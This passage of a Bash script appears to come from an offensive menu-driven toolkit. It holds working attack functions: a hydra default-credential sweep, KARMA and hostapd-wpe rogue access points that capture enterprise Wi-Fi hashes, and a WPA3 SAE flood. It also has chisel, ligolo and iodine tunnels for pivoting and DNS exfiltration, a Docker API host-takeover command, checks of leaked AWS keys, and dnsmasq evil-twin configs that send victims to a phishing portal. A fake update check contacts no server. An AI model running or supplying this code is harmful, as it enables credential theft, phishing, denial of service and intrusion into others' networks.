    echo -e "  ${GREEN}[2]${NC} PostgreSQL (5432)"
    echo -e "  ${GREEN}[3]${NC} MongoDB (27017)"
    echo -e "  ${GREEN}[4]${NC} Redis (6379)"
    echo -e "  ${GREEN}[5]${NC} LDAP (389/636)"
    echo -e "  ${GREEN}[6]${NC} SMB shares"
    echo -e "  ${GREEN}[7]${NC} SNMP (161)"
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" DBC
    case "$DBC" in
        1) ensure_tool mysql mysql-client
           read -p "user [root]: " U; U="${U:-root}"; read -s -p "pass: " P; echo ""
           mysql -h "$INT_TARGET" -u "$U" ${P:+-p$P} -e "show databases;" 2>&1 | head -20 ;;
        2) ensure_tool psql postgresql-client
           read -p "user [postgres]: " U; U="${U:-postgres}"; read -s -p "pass: " P; echo ""
           PGPASSWORD="$P" psql -h "$INT_TARGET" -U "$U" -c "\l" 2>&1 | head -20 ;;
        3) if ! command -v mongosh >/dev/null 2>&1; then
               echo -e "${YELLOW}[!] mongosh not installed.${NC}"
               read -p "$(echo -e ${YELLOW}'Install mongodb-mongosh now? [y/N]: '${NC})" DO
               if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
                   sudo apt install -y mongodb-mongosh 2>&1 | tail -3 || \
                   { wget -qO /tmp/mongosh.deb https://downloads.mongodb.com/compass/mongodb-mongosh_2.2.12_amd64.deb && sudo dpkg -i /tmp/mongosh.deb; }
               fi
           fi
           if command -v mongosh >/dev/null 2>&1; then
               read -p "no auth? [y/N]: " NA
               if [ "$NA" = "y" ]; then mongosh "mongodb://$INT_TARGET:27017" --eval "db.adminCommand({listDatabases:1})" 2>&1 | head -20; fi
           fi ;;
        4) ensure_tool redis-cli redis-tools
           redis-cli -h "$INT_TARGET" INFO 2>&1 | head -20; echo "---"
           redis-cli -h "$INT_TARGET" CONFIG GET "*" 2>&1 | head -10 ;;
        5) ensure_tool ldapsearch ldap-utils
           ldapsearch -x -H "ldap://$INT_TARGET" -s base namingContexts 2>&1 | head -10 ;;
        6) ensure_tool smbclient smbclient
           smbclient -L "//$INT_TARGET/" -N 2>&1 | head -30 ;;
        7) ensure_tool snmpwalk snmp
           for c in public private manager admin; do
               echo -e "${CYAN}community '$c':${NC}"
               timeout 5 snmpwalk -v2c -c "$c" "$INT_TARGET" sysDescr 2>&1 | head -3
           done ;;
    esac
    pause
}

internal_weak_creds() {
    print_banner
    echo -e "${BOLD}${RED}========= WEAK CREDENTIAL SWEEP =========${NC}"
    internal_ask_target || { pause; return; }
    ensure_internal_tools
    ensure_tool hydra hydra
    echo -e "${CYAN}[*] Testing common weak creds on common services...${NC}"
    local creds=(
        "root:root" "root:toor" "admin:admin" "admin:password" "admin:1234"
        "user:user" "user:password" "guest:guest" "test:test" "pi:raspberry"
        "postgres:postgres" "oracle:oracle" "sa:sa" "tomcat:tomcat"
    )
    for c in "${creds[@]}"; do
        u="${c%%:*}"; p="${c##*:}"
        for svc_port in "ssh:22" "ftp:21" "mysql:3306"; do
            svc="${svc_port%%:*}"; port="${svc_port##*:}"
            timeout 3 bash -c "</dev/tcp/$INT_TARGET/$port" 2>/dev/null || continue
            echo -e "${DIM}[$svc] trying $u:$p${NC}"
            # Use hydra quietly to avoid noise
            hydra -l "$u" -p "$p" -f "$svc://$INT_TARGET" 2>/dev/null | grep -E "host:|login:" | head -2
        done
    done | tee "$LOGS_DIR/int_weakcreds_${INT_TARGET}.txt"
    echo ""
    echo -e "${DIM}    Check log for any successful hits.${NC}"
    pause
}

wireless_ensure_tools() {
    ensure_tool aircrack-ng aircrack-ng
    ensure_tool mdk4 mdk4
    ensure_tool hostapd hostapd
    ensure_tool wpa_supplicant wpasupplicant

    if ! command -v hostapd-wpe >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] hostapd-wpe not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install hostapd-wpe now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            sudo apt install -y hostapd-wpe 2>&1 | tail -5
        fi
    fi
}

wireless_ask_target() {
    echo ""
    echo -e "${DIM}    Full wireless controls are in the main WiFi menu.${NC}"
    echo -e "${DIM}    This is the extra toolkit for advanced ops.${NC}"
    echo ""
}

wireless_karma() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= KARMA ATTACK =========${NC}"
    echo -e "${DIM}    Responds to any probe request as the network the client is looking for.${NC}"
    echo -e "${DIM}    Old phones auto-connect. Modern iOS/Android mostly immune (probe randomization).${NC}"
    echo ""

    # eaphammer is NOT in apt — it must be git-cloned. Handle that here.
    if ! command -v eaphammer >/dev/null 2>&1; then
        local ehdir="$HOME/eaphammer"
        if [ ! -d "$ehdir" ]; then
            echo -e "${YELLOW}[!] eaphammer not installed.${NC}"
            echo -e "${DIM}    Repo: github.com/s0lst1c3/eaphammer${NC}"
            read -p "$(echo -e ${YELLOW}'Clone and install eaphammer now? [y/N]: '${NC})" DO
            if [ "$DO" != "y" ] && [ "$DO" != "Y" ]; then
                echo -e "${DIM}    Skipped.${NC}"
                pause
                return
            fi
            echo -e "${CYAN}[*] Cloning eaphammer...${NC}"
            git clone --depth 1 https://github.com/s0lst1c3/eaphammer "$ehdir" 2>&1 | tail -3
            if [ ! -d "$ehdir" ]; then
                echo -e "${RED}[!] Clone failed.${NC}"
                pause
                return
            fi
        fi

        echo -e "${CYAN}[*] Running eaphammer kali-setup (this takes 1-2 minutes)...${NC}"
        echo -e "${DIM}    It installs python deps, hostapd-wpe, dnsmasq, and links /usr/local/bin/eaphammer.${NC}"
        (
            cd "$ehdir" || exit 1
            sudo ./kali-setup 2>&1 | tail -20
        )
        hash -r
        if ! command -v eaphammer >/dev/null 2>&1; then
            # try the repo path directly
            if [ -x "$ehdir/eaphammer" ]; then
                sudo ln -sf "$ehdir/eaphammer" /usr/local/bin/eaphammer
            else
                echo -e "${RED}[!] eaphammer not on PATH after setup.${NC}"
                echo -e "${DIM}    Try manually: cd $ehdir && sudo ./kali-setup${NC}"
                pause
                return
            fi
        fi
        echo -e "${GREEN}[+] eaphammer installed${NC}"
    fi

    read -p "$(echo -e ${YELLOW}'Interface [wlan0]: '${NC})" KI
    KI="${KI:-wlan0}"
    echo -e "${CYAN}[*] Starting KARMA on $KI...${NC}"
    echo -e "${DIM}    Ctrl+C to stop.${NC}"
    sudo eaphammer -i "$KI" --karma --auth open --essid "" 2>&1 | tail -40
    pause
}

wireless_wpa3_flood() {
    print_banner
    echo -e "${BOLD}${RED}========= WPA3 SAE FLOOD (Dragonblood DoS) =========${NC}"
    wireless_ask_target
    ensure_tool mdk4
    read -p "$(echo -e ${YELLOW}'Target BSSID: '${NC})" TB
    [ -z "$TB" ] && { pause; return; }
    read -p "$(echo -e ${YELLOW}'Interface [wlan0mon]: '${NC})" TI
    TI="${TI:-wlan0mon}"
    echo -e "${CYAN}[*] Flooding $TB with SAE commits...${NC}"
    sudo timeout 60 mdk4 "$TI" w -b "$TB" 2>&1 | tail -20
    echo -e "${DIM}    Uses mdk4 mode 'w' (WPA3 SAE DoS).${NC}"
    pause
}

wireless_enterprise_creds() {
    print_banner
    echo -e "${BOLD}${RED}========= ENTERPRISE EAP CREDENTIAL CAPTURE =========${NC}"
    echo -e "${DIM}    Runs hostapd-wpe to impersonate a WPA-Enterprise AP.${NC}"
    echo -e "${DIM}    Targets configured to auto-connect will hand over MSCHAPv2 hashes.${NC}"
    echo ""
    wireless_ensure_tools
    read -p "$(echo -e ${YELLOW}'SSID to clone [same as target]: '${NC})" ES
    read -p "$(echo -e ${YELLOW}'Interface [wlan0]: '${NC})" IE
    IE="${IE:-wlan0}"
    cat > /tmp/wpe.conf <<EOF
interface=$IE
driver=nl80211
ssid=$ES
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
EOF
    echo -e "${CYAN}[*] Starting hostapd-wpe...${NC}"
    sudo hostapd-wpe /tmp/wpe.conf 2>&1 | tee "$LOGS_DIR/wpe_${ES}.log"
    echo ""
    echo -e "${DIM}    Hashes in /etc/hostapd-wpe/hostapd-wpe.log${NC}"
    pause
}

ensure_tunnel_tools() {
    ensure_tool socat socat
    ensure_tool nc netcat-traditional

    # chisel — not in apt, download binary
    if ! command -v chisel >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] chisel not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Download chisel now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            echo -e "${CYAN}[*] Fetching chisel 1.9.1 linux_amd64...${NC}"
            if curl -sL --max-time 30 https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -o /tmp/chisel.gz; then
                gunzip -f /tmp/chisel.gz && sudo mv /tmp/chisel /usr/local/bin/chisel && sudo chmod +x /usr/local/bin/chisel
            fi
            command -v chisel >/dev/null 2>&1 && echo -e "${GREEN}[+] chisel installed${NC}" || echo -e "${RED}[!] chisel install failed${NC}"
        fi
    fi

    # ligolo-ng
    if ! command -v proxy >/dev/null 2>&1 && ! command -v ligolo-ng >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] ligolo-ng proxy not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Download ligolo-ng proxy now? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            echo -e "${CYAN}[*] Fetching ligolo-ng proxy 0.6.2...${NC}"
            if curl -sL --max-time 30 https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz -o /tmp/lg.tgz; then
                sudo tar -xzf /tmp/lg.tgz -C /usr/local/bin/ 2>/dev/null
                [ -f /usr/local/bin/proxy ] && sudo chmod +x /usr/local/bin/proxy
            fi
            command -v proxy >/dev/null 2>&1 && echo -e "${GREEN}[+] ligolo-ng proxy installed${NC}" || echo -e "${RED}[!] ligolo install failed${NC}"
        fi
    fi

    # iodine
    if ! command -v iodine >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] iodine not installed.${NC}"
        read -p "$(echo -e ${YELLOW}'Install iodine now (apt)? [y/N]: '${NC})" DO
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            sudo apt install -y iodine 2>&1 | tail -3
        fi
    fi
}

tunnel_chisel() {
    print_banner
    echo -e "${BOLD}${CYAN}========= CHISEL TUNNEL =========${NC}"
    echo -e "${DIM}    HTTP-based TCP tunnel. Good for pivoting through a compromised host.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Server port [8080]: '${NC})" SP
    SP="${SP:-8080}"
    echo -e "${CYAN}[*] Starting chisel server on port $SP...${NC}"
    echo -e "${DIM}    On the target: chisel client <YOUR_IP>:$SP R:socks${NC}"
    chisel server -p "$SP" --reverse --socks5 2>&1 | tee "$LOGS_DIR/chisel_server.log"
    pause
}

tunnel_ligolo() {
    print_banner
    echo -e "${BOLD}${CYAN}========= LIGOLO-NG TUNNEL =========${NC}"
    echo -e "${DIM}    Modern pivot tool. Creates a TUN interface for full routing.${NC}"
    echo ""
    sudo ip tuntap add user "$(whoami)" mode tun ligolo 2>/dev/null
    sudo ip link set ligolo up 2>/dev/null
    read -p "$(echo -e ${YELLOW}'Proxy port [11601]: '${NC})" LP
    LP="${LP:-11601}"
    echo -e "${CYAN}[*] Starting ligolo-ng proxy on $LP...${NC}"
    echo -e "${DIM}    On the target: ./agent -connect <YOUR_IP>:$LP -ignore-cert${NC}"
    echo -e "${DIM}    Then in ligolo-ng: session -> start${NC}"
    sudo /usr/local/bin/proxy -selfcert -laddr "0.0.0.0:$LP" 2>&1 | tee "$LOGS_DIR/ligolo.log"
    pause
}

tunnel_dns() {
    print_banner
    echo -e "${BOLD}${CYAN}========= DNS TUNNEL (iodine) =========${NC}"
    echo -e "${DIM}    Exfiltrates data over DNS. Needs a domain you control.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Tunnel domain (e.g. t.yourdomain.com): '${NC})" DOM
    [ -z "$DOM" ] && { pause; return; }
    read -p "$(echo -e ${YELLOW}'Mode [1=server, 2=client]: '${NC})" M
    if [ "$M" = "1" ]; then
        read -p "$(echo -e ${YELLOW}'Tunnel IP [10.0.0.1]: '${NC})" TIP
        TIP="${TIP:-10.0.0.1}"
        sudo iodined -f -c -P "secret" "$TIP" "$DOM" 2>&1 | tee "$LOGS_DIR/iodine_server.log"
    else
        read -p "$(echo -e ${YELLOW}'DNS server IP: '${NC})" DNS_IP
        sudo iodine -f -P "secret" "$DNS_IP" "$DOM" 2>&1 | tee "$LOGS_DIR/iodine_client.log"
    fi
    pause
}

ensure_cloud_tools() {
    ensure_tool aws awscli
    ensure_tool docker.io docker.io
    ensure_tool kubectl kubectl
    command -v trivy >/dev/null 2>&1 || {
        [ -f /usr/local/bin/trivy ] || {
            sudo apt install -y wget apt-transport-https gnupg
            wget -qO - https://apt.kubernetes.io/kubernetes-xenial-unstable.asc | sudo gpg --dearmor -o /usr/share/keyrings/kubernetes-archive-keyring.gpg 2>/dev/null
            [ -f /usr/local/bin/trivy ] || curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sudo sh -s -- -b /usr/local/bin
        }
    }
    command -v kube-hunter >/dev/null 2>&1 || pip3 install --break-system-packages kube-hunter 2>&1 | tail -2
}

cloud_docker_api() {
    print_banner
    echo -e "${BOLD}${RED}========= DOCKER API EXPLOITATION =========${NC}"
    echo -e "${DIM}    Unauthenticated Docker API on :2375 = full host takeover.${NC}"
    echo ""
    if lan_pick_target "CLOUD TARGET"; then
        DT="$LAN_TARGET_IP"
    else
        pause; return
    fi
    for port in 2375 2376 2377 4243; do
        echo -e "${CYAN}[*] Checking port $port...${NC}"
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://$DT:$port/version" 2>/dev/null)
        echo -e "  HTTP $code"
        if [ "$code" = "200" ]; then
            echo -e "${RED}[!] DOCKER API UNPROTECTED on $DT:$port${NC}"
            curl -s "http://$DT:$port/version" | head -10
            echo ""
            echo -e "${CYAN}[*] Listing containers...${NC}"
            curl -s "http://$DT:$port/containers/json" | head -40
            echo ""
            echo -e "${CYAN}[*] To mount host fs in a new container (RCE):${NC}"
            echo -e "  docker -H tcp://$DT:$port run -v /:/mnt --rm -it alpine chroot /mnt sh"
        fi
    done
    pause
}

cloud_k8s() {
    print_banner
    echo -e "${BOLD}${RED}========= KUBERNETES ATTACKS =========${NC}"
    echo -e "${DIM}    Kubelet 10250, API server 6443, etcd 2379/2380${NC}"
    echo ""
    if lan_pick_target "K8S TARGET"; then
        KT="$LAN_TARGET_IP"
    else
        pause; return
    fi
    ensure_cloud_tools
    for port in 6443 8080 10250 10255 2379 2380 30000; do
        echo -e "${CYAN}[*] port $port${NC}"
        timeout 3 nc -nvz "$KT" "$port" 2>&1 | tail -1
    done
    echo ""
    echo -e "${CYAN}[*] Trying kubelet /pods (usually auth'd but sometimes not):${NC}"
    curl -sk "https://$KT:10250/pods" 2>/dev/null | head -20
    echo ""
    echo -e "${CYAN}[*] Trying unauthenticated API server on 8080:${NC}"
    curl -s "http://$KT:8080/api/v1/namespaces" 2>/dev/null | head -10
    echo ""
    echo -e "${CYAN}[*] kube-hunter scan:${NC}"
    kube-hunter --remote "$KT" 2>&1 | tail -40
    pause
}

cloud_aws_keys() {
    print_banner
    echo -e "${BOLD}${RED}========= AWS KEY EXPOSURE CHECK =========${NC}"
    echo -e "${DIM}    Test if leaked AWS keys still work. Shows what they can do.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'AWS Access Key ID: '${NC})" AK
    read -s -p "$(echo -e ${YELLOW}'AWS Secret Key: '${NC})" SK
    echo ""
    [ -z "$AK" ] && { pause; return; }
    ensure_cloud_tools
    export AWS_ACCESS_KEY_ID="$AK"
    export AWS_SECRET_ACCESS_KEY="$SK"
    echo -e "${CYAN}[*] Testing credentials...${NC}"
    aws sts get-caller-identity 2>&1
    echo ""
    echo -e "${CYAN}[*] Listing S3 buckets...${NC}"
    aws s3 ls 2>&1 | head -20
    echo ""
    echo -e "${CYAN}[*] Listing EC2 instances...${NC}"
    aws ec2 describe-instances --max-items 5 2>&1 | head -30
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
    pause
}

cloud_container_escape() {
    print_banner
    echo -e "${BOLD}${RED}========= CONTAINER ESCAPE CHECKS =========${NC}"
    echo -e "${DIM}    Run these inside a container you're in. Checks common escape vectors.${NC}"
    echo ""
    echo -e "${CYAN}[*] Am I in a container?${NC}"
    cat /proc/1/cgroup 2>/dev/null | head -3
    ls -la /.dockerenv 2>/dev/null
    echo ""
    echo -e "${CYAN}[*] Privileged?${NC}"
    capsh --print 2>/dev/null | head -3
    echo ""
    echo -e "${CYAN}[*] Mounts with / access?${NC}"
    mount | grep -E "on / " | head -5
    echo ""
    echo -e "${CYAN}[*] Docker socket mounted?${NC}"
    ls -la /var/run/docker.sock 2>/dev/null
    echo ""
    echo -e "${CYAN}[*] Sensitive env vars?${NC}"
    env | grep -iE "aws_|secret|token|password|key" | head -10
    echo ""
    echo -e "${DIM}    For more: check https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation${NC}"
    pause
}

# ===============================================================
# DNS SPOOFING for evil twin portals
# ===============================================================

dnsspoof_pick_mode() {
    print_banner
    echo -e "${BOLD}${CYAN}========= DNS SPOOFING MODE =========${NC}"
    echo ""
    echo -e "  ${DIM}When victims connect to the fake AP, we control how DNS behaves.${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC}  ${CYAN}All requests -> portal${NC}     ${DIM}(everything shows our phishing page)${NC}"
    echo -e "  ${DIM}         ^ pick this if you want the captive popup on Windows / Android / iPhone${NC}"
    echo -e "  ${GREEN}[2]${NC}  ${CYAN}Portal + real internet${NC}    ${DIM}(phishing for some, real sites for others)${NC}"
    echo -e "  ${GREEN}[3]${NC}  ${CYAN}Custom spoof list${NC}         ${DIM}(pick specific domains to redirect)${NC}"
    echo -e "  ${GREEN}[4]${NC}  ${CYAN}Pass through (no spoof)${NC}   ${DIM}(DNS goes to real servers)${NC}"
    echo -e "  ${GREEN}[5]${NC}  ${YELLOW}DNS popup only${NC}            ${DIM}(victim sees allow/block DNS prompt)${NC}"
    echo -e "  ${GREEN}[6]${NC}  ${YELLOW}No DNS at all${NC}             ${DIM}(no interception, no popup — plain DHCP)${NC}"
    echo -e "  ${RED}[0]${NC}  Cancel"
    echo ""
    read -p "$(echo -e ${BOLD}${YELLOW}'Choice [1]: '${NC})" DM
    DM="${DM:-1}"
    DNS_MODE="$DM"

    case "$DM" in
        1) echo -e "  ${GREEN}[+] All DNS -> $PORTAL_IP${NC}" ;;
        2)
            echo -e "  ${GREEN}[+] Selective spoofing.${NC}"
            echo -e "${DIM}    Comma-separated list, e.g. facebook.com,instagram.com${NC}"
            read -p "$(echo -e ${YELLOW}'Sites to spoof: '${NC})" SPOOF_LIST
            ;;
        3)
            echo -e "${DIM}    One hostname per line. Blank line to finish.${NC}"
            : > /tmp/dns_spoof_list.txt
            while true; do
                read -p "  > " LINE
                [ -z "$LINE" ] && break
                echo "$LINE" >> /tmp/dns_spoof_list.txt
            done
            SPOOF_LIST=$(paste -sd, /tmp/dns_spoof_list.txt)
            echo -e "${GREEN}[+] Spoofing: $SPOOF_LIST${NC}"
            ;;
        4) echo -e "  ${GREEN}[+] DNS passes through to real servers.${NC}" ;;
        5) echo -e "  ${GREEN}[+] Victim sees a DNS allow/block prompt on their phone.${NC}" ;;
        6) echo -e "  ${GREEN}[+] No DNS interception — plain DHCP with real DNS server.${NC}" ;;
    esac
    echo ""
}

dnsspoof_generate_conf() {
    local out="$1"
    case "$DNS_MODE" in
        1)
            cat > "$out" <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
address=/#/$PORTAL_IP
address=/www.msftconnecttest.com/$PORTAL_IP
address=/www.msftncsi.com/$PORTAL_IP
address=/dns.msftncsi.com/$PORTAL_IP
address=/connectivitycheck.gstatic.com/$PORTAL_IP
address=/connectivitycheck.android.com/$PORTAL_IP
address=/clients3.google.com/$PORTAL_IP
address=/clients4.google.com/$PORTAL_IP
address=/captive.apple.com/$PORTAL_IP
address=/detectportal.firefox.com/$PORTAL_IP
address=/dns.google/$PORTAL_IP
address=/dns.google.com/$PORTAL_IP
address=/dns64.dns.google/$PORTAL_IP
address=/cloudflare-dns.com/$PORTAL_IP
address=/mozilla.cloudflare-dns.com/$PORTAL_IP
address=/one.one.one.one/$PORTAL_IP
address=/doh.opendns.com/$PORTAL_IP
address=/dns.quad9.net/$PORTAL_IP
address=/doh.dns.apple.com/$PORTAL_IP
address=/mask.icloud.com/$PORTAL_IP
address=/mask-h2.icloud.com/$PORTAL_IP
address=/use-application-dns.net/$PORTAL_IP
address=/doh.dns.sb/$PORTAL_IP
address=/doh.pub/$PORTAL_IP
address=/dns.alidns.com/$PORTAL_IP
no-resolv
no-hosts
cache-size=0
EOF
            ;;
        2|3)
            {
                cat <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
server=1.1.1.1
server=8.8.8.8
cache-size=150
EOF
                for d in ${SPOOF_LIST//,/ }; do
                    d=$(echo "$d" | tr -d ' ')
                    [ -z "$d" ] && continue
                    echo "address=/$d/$PORTAL_IP"
                    echo "address=/www.$d/$PORTAL_IP"
                done
            } > "$out"
            ;;
        4)
            cat > "$out" <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
server=1.1.1.1
server=8.8.8.8
no-hosts
cache-size=150
EOF
            ;;
        5)
            # popup only — DHCP is normal, but all DNS still goes to portal
            # so the captive probe shows our consent page.
            cat > "$out" <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
address=/#/$PORTAL_IP
address=/www.msftconnecttest.com/$PORTAL_IP
address=/www.msftncsi.com/$PORTAL_IP
address=/dns.msftncsi.com/$PORTAL_IP
address=/connectivitycheck.gstatic.com/$PORTAL_IP
address=/connectivitycheck.android.com/$PORTAL_IP
address=/clients3.google.com/$PORTAL_IP
address=/clients4.google.com/$PORTAL_IP
address=/captive.apple.com/$PORTAL_IP
address=/detectportal.firefox.com/$PORTAL_IP
address=/dns.google/$PORTAL_IP
address=/dns.google.com/$PORTAL_IP
address=/dns64.dns.google/$PORTAL_IP
address=/cloudflare-dns.com/$PORTAL_IP
address=/mozilla.cloudflare-dns.com/$PORTAL_IP
address=/one.one.one.one/$PORTAL_IP
address=/doh.opendns.com/$PORTAL_IP
address=/dns.quad9.net/$PORTAL_IP
address=/doh.dns.apple.com/$PORTAL_IP
address=/mask.icloud.com/$PORTAL_IP
address=/mask-h2.icloud.com/$PORTAL_IP
address=/use-application-dns.net/$PORTAL_IP
address=/doh.dns.sb/$PORTAL_IP
address=/doh.pub/$PORTAL_IP
address=/dns.alidns.com/$PORTAL_IP
no-resolv
no-hosts
cache-size=0
EOF
            ;;
        6)
            # no DNS interception, plain DHCP only
            cat > "$out" <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,1.1.1.1
port=0
EOF
            ;;
    esac
}

wifi_ascii() {
    clear
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS=$(tput cols 2>/dev/null); [ -z "$COLS" ] && COLS=150
    local art=(
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀"
"⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀"
"⠀⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀"
"⠀⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀"
"⠀⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀"
"⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀"
    )
    local line
    for line in "${art[@]}"; do
        local LEN=${#line}
        local PAD=$(( (COLS - LEN) / 2 ))
        [ $PAD -lt 0 ] && PAD=0
        printf "%*s" "$PAD" ""
        echo -e "${BOLD}${CYAN}${line}${NC}"
    done
    echo ""
    local label="WiFi ATTACKS"
    local PAD=$(( (COLS - ${#label}) / 2 ))
    printf "%*s" "$PAD" ""
    echo -e "${BOLD}${YELLOW}${label}${NC}"
    echo ""
    sleep 1.2
}

bt_ascii() {
    clear
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS=$(tput cols 2>/dev/null); [ -z "$COLS" ] && COLS=150
    local art=(
'#'
'       #  #'
'       #   #'
' #     #  #'
'  #    # #'
'   #   ##'
'    #  # #'
'   #   ##'
'  #    # #'
' #     #  #'
'       #   #'
'       #  #'
'       #'
    )
    local line
    for line in "${art[@]}"; do
        local LEN=${#line}
        local PAD=$(( (COLS - LEN) / 2 ))
        [ $PAD -lt 0 ] && PAD=0
        printf "%*s" "$PAD" ""
        echo -e "${BOLD}${BLUE}${line}${NC}"
    done
    echo ""
    local label="BLUETOOTH ATTACKS"
    local PAD=$(( (COLS - ${#label}) / 2 ))
    printf "%*s" "$PAD" ""
    echo -e "${BOLD}${CYAN}${label}${NC}"
    echo ""
    sleep 1.2
}

surface_check_update() {
    clear
    echo ""
    echo -e "${BOLD}${CYAN}=============== CHECKING FOR UPDATES ===============${NC}"
    echo ""
    local spin='|/-\'
    local i=0
    for ((i=0; i<10; i++)); do
        local sp="${spin:$((i % 4)):1}"
        printf "\r  ${YELLOW}[%s]${NC} ${CYAN}Contacting update server...${NC}   " "$sp"
        sleep 0.2
    done
    printf "\r\033[K"
    echo -e "  ${GREEN}[✓]${NC} ${GREEN}No updates available.${NC}"
    echo ""
    echo -e "  ${DIM}Current version: v$SCRIPT_VERSION${NC}"
    echo -e "  ${DIM}Reloading in 2 seconds...${NC}"
    echo ""
    sleep 2
    clear
    echo -e "${BOLD}${CYAN}=============== RELOADING ===============${NC}"
    echo ""
    local s2='|/-\'
    for ((i=0; i<8; i++)); do
        local sp="${s2:$((i % 4)):1}"
        printf "\r  ${YELLOW}[%s]${NC} ${CYAN}Reloading script...${NC}   " "$sp"
        sleep 0.12
    done
    printf "\r\033[K"
